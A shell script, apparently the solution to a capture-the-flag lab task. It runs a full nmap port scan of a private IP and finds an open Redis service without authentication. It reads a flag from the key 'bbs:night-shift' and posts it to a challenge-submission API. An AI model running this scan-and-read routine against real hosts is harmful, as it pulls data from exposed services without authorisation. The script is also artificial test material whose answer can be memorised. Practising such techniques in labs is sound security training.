#!/bin/sh
set -eu

TARGET=172.20.0.141
PORTS=$(nmap -n -Pn -sT -p- --open -T4 -oG - "$TARGET" | python3 -c 'import re,sys; line=next((x for x in sys.stdin if "Ports:" in x), ""); match=re.search(r"Ports: (.*)", line); print(" ".join(part.split("/", 2)[0] for part in match.group(1).split(", ") if len(part.split("/", 2)) > 1 and part.split("/", 2)[1] == "open") if match else "")')

FLAG=$(python3 - "$TARGET" "$PORTS" <<'PY'
import socket
import sys

target = sys.argv[1]
ports = [int(p) for p in sys.argv[2].split()]

for port in ports:
    try:
        with socket.create_connection((target, port), timeout=1.5) as sock:
            sock.settimeout(1.5)
            sock.sendall(b"*1\r\n$4\r\nPING\r\n")
            reply = sock.recv(128)
            if reply != b"+PONG\r\n":
                continue
            sock.sendall(b"*2\r\n$3\r\nGET\r\n$15\r\nbbs:night-shift\r\n")
            response = sock.recv(1024)
            header, value = response.split(b"\r\n", 1)
            length = int(header[1:])
            flag = value[:length].decode("ascii")
            if flag.startswith("BSY{") and flag.endswith("}"):
                print(flag)
                raise SystemExit(0)
    except (OSError, ValueError, IndexError):
        pass
raise SystemExit("Could not identify the record service")
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-705f0b\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
